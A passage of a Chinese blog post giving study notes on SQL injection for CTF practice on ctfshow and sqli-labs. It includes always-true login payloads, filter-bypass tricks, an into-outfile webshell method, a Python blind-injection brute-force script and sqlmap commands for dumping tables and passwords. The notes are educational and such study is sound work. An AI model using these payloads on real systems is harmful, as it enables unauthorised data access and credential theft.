+select * from user where id = &#39;1&#39;;
+</code></pre>
+<p>判断是数字型注入还是字符型注入的方式（只要测试最后的时候只有一个左引号会不会报错即可）</p>
+<ul>
+<li>① 1‘ &amp; ’1‘&#x3D;’1        ② 1 &amp; 1&#x3D;1<ul>
+<li>①报错 而 ② 不报错可能是数字型注入</li>
+<li>①不报错 而 ②报错可能是字符型注入</li>
+<li>其余的方式可能是有所过滤</li>
+</ul>
+</li>
+</ul>
+<h3 id="2、报错注入与盲注"><a href="#2、报错注入与盲注" class="headerlink" title="2、报错注入与盲注"></a>2、报错注入与盲注</h3><p>产生这种分类的原因是返回的结果不同，可分为报错注入与盲注</p>
+<ul>
+<li><p>报错注入：程序会将获取到的信息或者是报错信息直接显示在页面上就是报错注入</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220718125224941.png" alt="image-20220718125224941"></p>
+</li>
+<li><p>盲注：在注入的过程中程序不显示任何SQL报错信息</p>
+</li>
+</ul>
+<h2 id="三、SQL基本知识点"><a href="#三、SQL基本知识点" class="headerlink" title="三、SQL基本知识点"></a>三、SQL基本知识点</h2><h3 id="1、注释符"><a href="#1、注释符" class="headerlink" title="1、注释符"></a>1、注释符</h3><p>（1）单行注释</p>
+<ul>
+<li>– （空格）</li>
+<li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li>
+</ul>
+<p>（2）多行注释</p>
+<ul>
+<li>&#x2F;**&#x2F;</li>
+</ul>
+<p>注意点：</p>
+<p>① 两横杠注释的后面加上一个空格后，后面的才是注释，所以在sql注入的时候需要加上一个加号（+），因为记号经过url解码以后就会为一个空格</p>
+<img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220713095514511.png" alt="image-20220713095514511" style="zoom:200%;" />
+
+
+
+<p>② 在url时不能直接写入 #号：因为url中的 # 本来的用途是跳转到页面锚点，一个URL中的#后面的值不影响访问网页内容，可以理解成说#后面的内容不会发送到服务端，所以sql查询是无法实现，需要使用 #编码的 %23来实现，因为这样进行传送时，它会将其（%23）进行解码成 #，以实现注释功能</p>
+<p>③ 注释的作用就是注释后面的内容， 在sql注入过程中有时候当你进行sql语句查询时最后面的引号无法与前面的单引号形成闭合，导致最后面多存在一条单引号， 所以需要使用注释符将后面的单引号进行注释掉</p>
+<pre><code class="sql">select username, password from user where id=&#39;$content&#39;
+$content = 1&#39; union select 1,2 --+
+以此实现语句的正确==&gt; 
+select username, password from user where id=&#39;1&#39; union select 1,2 -- &#39; 
+</code></pre>
+<h3 id="2、union联合查询"><a href="#2、union联合查询" class="headerlink" title="2、union联合查询"></a>2、union联合查询</h3><blockquote>
+<p>联合查询就是把多次查询的结果合并起来，形成新的查询结果集，但是它有一些语法限制</p>
+</blockquote>
+<ul>
+<li>每一个查询的列数和字段类型都要相同</li>
+<li>union是将全部的数据合并在一起，而union all是将合并后的数据去重</li>
+</ul>
+<p>例如下面的会把user表中所有的数据都给展示出来</p>
+<pre><code class="sql">select * from user where username != flag  union select * from user where username=flag;
+</code></pre>
+<h3 id="3、连接查询"><a href="#3、连接查询" class="headerlink" title="3、连接查询"></a>3、连接查询</h3><p>连接查询有全连接、右外连接与左外连接，sql注入中常见的一般是右外连接</p>
+<p>右外连接：右表中的记录都会记录在结果集当中，并于左边相对应，如果左表没有则显示null</p>
+<pre><code class="sql">select * from user a right join admin b a.id=b.id;
+</code></pre>
+<img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220718152108272.png" alt="image-20220718152108272" style="zoom:150%;" />
+
+
+
+
+
+<h3 id="4、group-by-与-having"><a href="#4、group-by-与-having" class="headerlink" title="4、group by 与 having"></a>4、group by 与 having</h3><p>（1）group by表示分组操作， having表示查询结果返回结果集以后对查询结果进行过滤操作， 它的作用相当于where，但与where存在一定区别</p>
+<pre><code class="sql">mysql&gt; select username,passwd from user group by username, passwd;
++----------+-----------------------------+
+| username | passwd                      |
++----------+-----------------------------+
+| 0admin   | 13123                       |
+| flag     | flag&#123;this_is_flag_ha_ha_ha&#125; |
+| lisi     | 12345                       |
+| wangwu   | 123456                      |
+| zhangsan | 1234                        |
++----------+-----------------------------+
+5 rows in set (0.05 sec)
+
+mysql&gt; select username,passwd from user group by username, passwd having username!=&#39;flag&#39;;
++----------+--------+
+| username | passwd |
++----------+--------+
+| 0admin   | 13123  |
+| lisi     | 12345  |
+| wangwu   | 123456 |
+| zhangsan | 1234   |
++----------+--------+
+4 rows in set (0.04 sec)
+</code></pre>
+<p>说明：查询列表必须特殊，要求是分组函数和group by后出现的字段</p>
+<p>（2）having与where的区别</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yajie_china/article/details/80089553">https://blog.csdn.net/yajie_china/article/details/80089553</a></p>
+<h3 id="5、运算符的优先级"><a href="#5、运算符的优先级" class="headerlink" title="5、运算符的优先级"></a>5、运算符的优先级</h3><p>根据运算符的优先级会进行执行顺序的调整，特别配合or运算符会实现意想不到的结果，例如存在如下的sql语句</p>
+<pre><code class="sql">select * from user where username != &#39;flag&#39; or id = &#39;$id&#39; limit 0, 1;
+</code></pre>
+<p>当我们输入的id为：</p>
+<pre><code class="sql">$id = 999&#39; or id=&#39;26&#39; and &#39;1&#39;=&#39;1
+</code></pre>
+<p>此时的sql语句为：</p>
+<pre><code class="sql">select * from user where (username != &#39;flag&#39; or id = &#39;999&#39;) or (id=&#39;26&#39; and &#39;1&#39;=&#39;1&#39;) limit 0,1;
+</code></pre>
+<p>根据运算符的优先级， 这样就会输入id&#x3D;26的那一行的内容了</p>
+<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220718130615867.png" alt="image-20220718130615867"></p>
+<h3 id="6、常见的函数"><a href="#6、常见的函数" class="headerlink" title="6、常见的函数"></a>6、常见的函数</h3><p>（1）substr：主要是用于截取对应字段指定长度</p>
+<pre><code>substr函数(string, pos, len)
+</code></pre>
+<ul>
+<li>string：指定字符串</li>
+<li>pos：规定字符串从何处开始（这里是从1开始的而不是0），为正数从开头开始，为负数从结尾开始</li>
+<li>len：要截取字符串的长度（从1开始计数）</li>
+</ul>
+<p>（2） regexp运算符</p>
+<p>它是正则表达式（regular expression）的缩写，使用的方式如下，但是除了sql语句正常的%与_以外，正则表达式的那些语法均能使用</p>
+<pre><code class="sql">select * from user where username like &quot;%la%&quot;;
+
+select * from user where username regexp &quot;%la%&quot;;
+
+# ^：查找的字符串以什么开头：输入的名字必须以flag开头
+select *from user where username regexp &quot;^flag&quot;
+
+# $:查找的字符串以什么结尾：查找的姓名必须以 &#125; 结尾
+select *from user where username regexp &quot;&#125;$&quot;
+
+# |:表示多个搜索方式：查询姓名以flag开头或者是以&#125;结尾的
+select *from user where username regexp &quot;^flag|&#125;$&quot;
+</code></pre>
+<p>（3）if语句</p>
+<pre><code class="sql">IF( expr1 , expr2 , expr3 )
+</code></pre>
+<ul>
+<li>expr1 的值为 TRUE，则返回值为 expr2 </li>
+<li>expr1 的值为FALSE，则返回值为 expr3</li>
+</ul>
+<p>（4） load_file（）与  into outfile（）</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44940180/article/details/107859666?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107859666-blog-99558836.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107859666-blog-99558836.pc_relevant_default&amp;utm_relevant_index=4">https://blog.csdn.net/weixin_44940180/article/details/107859666?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107859666-blog-99558836.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107859666-blog-99558836.pc_relevant_default&amp;utm_relevant_index=4</a></p>
+<p>① load_file（）：读取一个文件并将其内容作为一个字符串返回</p>
+<p>② into outfile()：将查询到的数据下载到本地， 或者是保存成一个webshell上传至服务器</p>
+<ul>
+<li>具有root权限</li>
+<li>在数据库配置文件中，配置项含有：secure_five_priv&#x3D;’’。（而在数据库中默认此项为null）</li>
+<li>知道数据库的绝对路径</li>
+</ul>
+<p>说明：如果有权限的话可以直接写一句话木马上去，实现远程代码执行</p>
+<p>两者的区别：</p>
+<ul>
+<li>load_file：联合查询中会占一位，用括号单引号包围路径</li>
+<li>into outfile：联合查询不占位，用单引号包围路径</li>
+</ul>
+<h3 id="7、information-schema数据库"><a href="#7、information-schema数据库" class="headerlink" title="7、information_schema数据库"></a>7、information_schema数据库</h3><p>参考链接： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38972910/article/details/86012110">https://blog.csdn.net/weixin_38972910/article/details/86012110</a></p>
+<p>（1）概念</p>
+<p>information schema：信息的组织与结构  &#x3D;&#x3D;》 提供了访问数据库元数据的方式</p>
+<p>元数据：关于数据的数据，如数据库名、表名、列的数据类型或访问权限的等等</p>
+<p>information_schema：存储了schemata表（schema的复数形式）、tables表和columns表</p>
+<p>（2）数据库中各个表中存储的信息</p>
+<p>① schemata表：提供了当前MySQL当中所有的数据库的信息，show databases命令的结果就取自此表，存储所有的数据库名</p>
+<pre><code class="sql">mysql&gt; select * from information_schema.schemata;
++--------------+--------------------+----------------------------+------------------------+----------+
+| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
++--------------+--------------------+----------------------------+------------------------+----------+
+| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |
+| def          | challenges         | gbk                        | gbk_chinese_ci         | NULL     |
+| def          | ctfshow            | utf8                       | utf8_general_ci        | NULL     |
+| def          | mysql              | latin1                     | latin1_swedish_ci      | NULL     |
+| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |
+| def          | security           | utf8                       | utf8_unicode_ci        | NULL     |
+| def          | sys                | utf8                       | utf8_general_ci        | NULL     |
++--------------+--------------------+----------------------------+------------------------+----------+
+</code></pre>
+<p>② tables表：存储了数据库中的表的信息，包括某个表属于哪一个schema、表类型、表引擎、创建时间等信息。show tables from “schemaname（数据库名）的结果就出自这里。重点关注的列是table_name以及 table_schema</p>
+<img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220713114503984.png" alt="image-20220713114503984" style="zoom:150%;" />
+
+<p>查询语句：</p>
+<pre><code class="sql">select table_name from information_schema.tables where table_schema=datdabase();
+</code></pre>
+<p>③ columns表：提供了表中的所有列信息，包括某个表的所有列以及每一列的信息，show columns from “表名”; 命令的结果就出自此表</p>
+<img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220713124746979.png" alt="image-20220713124746979" style="zoom:150%;" />
+
+
+
+<p>查询语句</p>
+<pre><code class="sql">select column_name from information_schema.columns where table_name=&#39;表名&#39; ;
+</code></pre>
+<h2 id="四、常见的过滤以及绕过方式"><a href="#四、常见的过滤以及绕过方式" class="headerlink" title="四、常见的过滤以及绕过方式"></a>四、常见的过滤以及绕过方式</h2><h3 id="1、万能钥匙"><a href="#1、万能钥匙" class="headerlink" title="1、万能钥匙"></a>1、万能钥匙</h3><pre><code class="sql">999&#39; or &#39;1&#39; = &#39;1 
+999&#39; or username=&#39;flag
+999&#39; or &#39;1&#39; = &#39;1&#39; --+(%23)
+</code></pre>
+<h3 id="2、对于返回集的判断"><a href="#2、对于返回集的判断" class="headerlink" title="2、对于返回集的判断"></a>2、对于返回集的判断</h3><p>（1）结果集过滤掉了数字</p>
+<blockquote>
+<p>利用replace函数将数字转换成其余字符以后再查询出来即可</p>
+</blockquote>
+<p>注意点：</p>
+<ul>
+<li>使用特殊字符时注意不能使用本身带有特殊含义的符号，例如%、#、&amp;符号</li>
+</ul>
+<p>（2）过滤掉了ascii码表上的所有字符</p>
+<blockquote>
+<p>那么其实就需要将读取到的内容存储到一个文件当中，然后再查看该文件了</p>
+</blockquote>
+<pre><code class="sql"># 将从user表中查询到的账号密码写进文件&#39;/var/www/html/flag.txt&#39;当中、
+select username, password from ctfshow_user5 into outfile &#39;/var/www/html/flag.txt&#39;
+</code></pre>
+<p>说明：</p>
+<blockquote>
+<p>如果我们写进文件的内容是我们自己构造好的一句话木马， 那么此时就有可能实现远程代码执行，要写进一句话木马有三个条件，不然有可能可写不可执行，可执行不可写</p>
+</blockquote>
+<ul>
+<li>具有root权限</li>
+<li>在数据库配置文件中，配置项含有：secure_five_priv&#x3D;’’。（而在数据库中默认此项为null）</li>
+<li>知道数据库的绝对路径</li>
+</ul>
+<h3 id="3、过滤掉了空格"><a href="#3、过滤掉了空格" class="headerlink" title="3、过滤掉了空格"></a>3、过滤掉了空格</h3><ul>
+<li>常见的可以替换成空格的ascii码表有</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">十六进制</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">09</td>
+<td align="center">水平制表符</td>
+</tr>
+<tr>
+<td align="center">0a</td>
+<td align="center">换行符</td>
+</tr>
+<tr>
+<td align="center">0b</td>
+<td align="center">垂直制表符</td>
+</tr>
+<tr>
+<td align="center">0c</td>
+<td align="center">换页符</td>
+</tr>
+<tr>
+<td align="center">0D</td>
+<td align="center">回车键</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td align="center">空格</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p>或者是使用反引号进行替换，不过反引号的实际作用是对于表名列名与保留字相同时进行区分的。</p>
+</li>
+<li><p>&#x2F;**&#x2F;可以作为空格</p>
+</li>
+</ul>
+<h3 id="4、过滤掉了注释"><a href="#4、过滤掉了注释" class="headerlink" title="4、过滤掉了注释"></a>4、过滤掉了注释</h3><p>如果程序使用了limit限制，那么你输出的结果就会收到限制，那么查询时就需要具体精确到某一行</p>
+<h3 id="5、过滤掉了引号"><a href="#5、过滤掉了引号" class="headerlink" title="5、过滤掉了引号"></a>5、过滤掉了引号</h3><p>对于条件的查询，数字可以使用十六进制的形式实现，带有字符串的可以使用concat以及true、false的方式实现</p>
+<h3 id="6、过滤掉了select、where等"><a href="#6、过滤掉了select、where等" class="headerlink" title="6、过滤掉了select、where等"></a>6、过滤掉了select、where等</h3><p>过滤掉这些以后，显然就不能通过联合查询来绕过了，因为union使用的就是select，那么可以使用的另外一种方式就是group by 与 having</p>
+<pre><code class="sql">select * from user group by username having username like &#39;fla%&#39;;
+</code></pre>
+<h3 id="7、过滤掉了数字"><a href="#7、过滤掉了数字" class="headerlink" title="7、过滤掉了数字"></a>7、过滤掉了数字</h3><p>可以使用 true、false以及concat函数进行实现，甚至是字符也可以实现,需要根据ascii对应的值实现数量的</p>
+<pre><code class="sql"># 数字11
+select concat(true,true);
+# 数字21
+select concat(true+true,true);
+# 数字111
+select concat(true,true,true);
+# 字符 f
+select concat(char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true)) as value
+</code></pre>
+<h3 id="8、盲注"><a href="#8、盲注" class="headerlink" title="8、盲注"></a>8、盲注</h3><p>盲注一般都会存在如下的python脚本</p>
+<pre><code class="python">from urllib import response
+import requests
+import time
+
+url = &quot;http://81b26ac9-4239-4971-bd67-b9015ddedb25.challenge.ctf.show/select-waf.php&quot;
+flagdir = &quot;&#125;abcdefghijklmnopqrstuvwxyz-0123456789&#123;&quot;    # 字典
+payload = &quot;(ctfshow_user)where(pass)like\&quot;&#123;&#125;%\&quot;&quot; # payload
+flag=&quot;ctfshow&#123;&quot;         # 爆破获得的flag
+
+
+for i in range(0, 40):
+    for x in flagdir:
+        data = &#123;
+            &quot;tableName&quot;:payload.format(flag+x)      # 爆破内容
+        &#125;
+        response = requests.post(url, data=data)    #发送
+        time.sleep(0.3)
+        if response.text.find(&quot;user_count = 1&quot;)&gt;0:  #如果接收到user_count = 1，就说明爆破正确，flag字符串拼接，然后爆下一个字符
+            flag+=x
+            break
+        else:
+            continue
+    print(flag)
+</code></pre>
+<p>request库：继承了urllib2的所有特性。Requests支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的 URL 和 POST 数据自动编码</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37616069/article/details/80376776">https://blog.csdn.net/qq_37616069/article/details/80376776</a></p>
+<p>post请求方式：</p>
+<pre><code class="python">response = requests.post(url, data=data)
+
+# data：字典格式，一一对应的输入
+# response.text.find：返回的值中查找
+</code></pre>
+<p>handler()</p>
+<h3 id="9、md5、弱类型比较"><a href="#9、md5、弱类型比较" class="headerlink" title="9、md5、弱类型比较"></a>9、md5、弱类型比较</h3><p>（1）md5的概念</p>
+<pre><code class="php">md5(string $string, bool $binary = false): string
+</code></pre>
+<p>参数说明：</p>
+<ul>
+<li>$string：表示要加密的字符串</li>
+<li>$binary：它默认为false，如果binary为true时，那么md5摘要将以十六字符长度的原始二进制返回（不清楚，反正是有很多乱码），不然就会以32字符的十六进制数形式返回</li>
+</ul>
+<p>注意点：当bianary为true是，存在一个特殊的值ffifdyop，使得md5加密以后返回的是 ，再根据运算符的优先级就有机会构造payload</p>
+<blockquote>
+<p>‘or’6�]��!r,��b</p>
+</blockquote>
+<p>（2）弱类型比较</p>
+<blockquote>
+<p>最容易与interval函数进行结合，然后与数字进行比较，但是这里会存在一个强制转换问题，就是当你的字符串与数字进行比较的时候，字符串就会被强制转换成数字，而如果这个字符串时不是以数字或者时正负号开头的，那么其转换后的值就为0，这样就会导致当你查询到的结果为字母开头的话，只要你输入的内容是0就会绕过检查</p>
+</blockquote>
+<h2 id="五、sqlmap的使用"><a href="#五、sqlmap的使用" class="headerlink" title="五、sqlmap的使用"></a>五、sqlmap的使用</h2><h3 id="1、有关链接："><a href="#1、有关链接：" class="headerlink" title="1、有关链接："></a>1、有关链接：</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46634468/article/details/120887609">https://blog.csdn.net/weixin_46634468/article/details/120887609</a></li>
+</ul>
+<h3 id="2、查询内容"><a href="#2、查询内容" class="headerlink" title="2、查询内容"></a>2、查询内容</h3><p>（1）查询数据库名</p>
+<pre><code class="shell"># 查询所有的数据库
+python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -dbs --batch
+
+# 查询当前网站使用的数据库
+ python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --current-db --batch
+</code></pre>
+<p>参数说明</p>
+<ul>
+<li>-u ：表示url链接</li>
+<li>-dbs：所有的数据库</li>
+<li>–batch：忽略下面所有需要询问你时yes还是no的内容，执行默认的</li>
+<li>–current-db：当前的数据库</li>
+</ul>
+<p>（2）查询表名</p>
+<pre><code class="shell">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security  --tables --batch
+</code></pre>
+<p>参数说明：</p>
+<ul>
+<li>-D：database，数据库</li>
+<li>-tables：所有的表</li>
+</ul>
+<p>（3）查询列名</p>
+<pre><code class="shell">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security  -T users --columns --batch
+</code></pre>
+<p>（4）查询需要的数字</p>
+<pre><code class="shell"> python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security  -T users username, password --dump  --batch
+</code></pre>
+<p>参数说明：</p>
+<ul>
+<li>username,password：需要查询的列</li>
+<li>–dump：表示在页面展示出来，不下载到文件当中</li>
+</ul>
+<p>（5）Post请求方式</p>
+<pre><code class="shell">python sqlmap.py -u &quot;http://172.17.10.11/pikachu/vul/sqli/sqli_id.php&quot; -data=&quot;id=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -dbs --batch
+</code></pre>
+<h3 id="3、用户的权限问题"><a href="#3、用户的权限问题" class="headerlink" title="3、用户的权限问题"></a>3、用户的权限问题</h3><p>（1）列出数据库管理系统用户</p>
+<pre><code class="shell">python sqlmap.py -u &quot;url&quot; -users
+</code></pre>
+<p>（2）查看数据库用户所有密码</p>
+<pre><code class="shell">python sqlmap.py -u &quot;url&quot; -password
+</code></pre>
+<h2 id="待解决"><a href="#待解决" class="headerlink" title="待解决"></a>待解决</h2><ul>
+<li>sqlmap的实战的具体使用</li>
+<li>实战题目的分析</li>
+<li>ctfshow上面还有几道题</li>
+</ul>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮箱至 1627319559@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2017 swedsn
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 572px;
+    }
+    .nav.fullscreen {
+        margin-left: -572px;
+    }
+    .nav-left {
+        width: 150px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 512px;
+        }
+        .nav.fullscreen {
+            margin-left: -512px;
+        }
+        .nav-left {
+            width: 120px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 512px;
+            margin-left: -512px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #FFE7BA;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://browser9.qhimg.com/bdm/1000_618_85/t0183def7a3a7924215.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
